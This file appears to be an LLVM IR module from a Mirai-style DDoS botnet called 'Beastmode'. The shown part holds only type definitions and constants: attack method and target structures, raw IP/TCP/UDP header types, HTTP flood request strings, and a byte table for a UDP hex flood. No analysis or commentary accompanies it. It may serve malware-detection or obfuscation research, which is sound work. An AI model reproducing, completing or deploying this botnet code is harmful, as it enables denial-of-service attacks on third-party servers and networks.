; ModuleID = 'host/ir_bcf/Beastmode.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_udp_stdhex.leon_hex = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.65 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"B\00", align 1
@.str.67 = private unnamed_addr constant [2 x i8] c"C\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"D\00", align 1
